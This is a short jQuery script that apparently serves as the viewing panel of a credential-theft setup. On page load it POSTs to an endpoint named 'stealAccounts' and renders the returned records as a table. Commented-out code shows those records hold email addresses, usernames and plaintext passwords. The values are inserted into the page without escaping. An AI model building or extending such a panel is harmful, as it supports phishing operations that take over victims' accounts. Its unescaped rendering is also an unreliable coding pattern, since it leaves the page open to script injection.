var users;
$(document).ready(function() {

	function appendData(accounts) {
		//for (var i = 0; i < accounts.length; i++) {
			/*$('.table').append('
			<tr>
				<td>' + i + '</td>
				<td>' + accounts[i].email + '</td>
				<td>' + accounts[i].user + '</td>
				<td>' + accounts[i].pass + '</td>
			</tr>
			');*/
			//$('.table').append(' < tr >< td > ' + i + ' < /td> < td > ' + accounts[i].email + ' < /td> < td > ' + accounts[i].user + ' < /td> < td > ' + accounts[i].pass + ' < /td> < /tr>');
			/*var string = "<tr><td>" + i + "</td><td>" + accounts[i].email + "</td><td>" + accounts[i].user + "</td><td>" + accounts[i].pass + "</td><td>" + accounts[i].date + "</td></tr>";
			$('.table').append(string);
		}*/
		
		var keys = [];
		for(var i in accounts[0]) {
			keys.push(i);
		}
		for(var i = 0; i < keys.length; i++) {
			$('#header').append('<th>'+keys[i]+'</th>');
		}
		
		for(var i = 0; i < accounts.length; i++) {
			var string = "<tr><td>" + i + "</td>";
			for(var j = 0; j < keys.length; j++) {
				string += '<td>' + accounts[i][keys[j]] + '</td>';
				if(j == keys.length-1) {
					string += '</tr>';
					$('.table').append(string);
				}
			}
		}	
	}


	$.ajax({
		url: "/8100/stealAccounts",
		type: "POST",
		dataType: 'json',
		data: {},
		beforeSend: function() {},
		success: function(responseText, status, xhr, $form) {
			appendData(responseText);
			//console.log(responseText);
			users = responseText;
		},
		error: function(e) {

		}
	});
	//console.log("sent");
	//return false;


});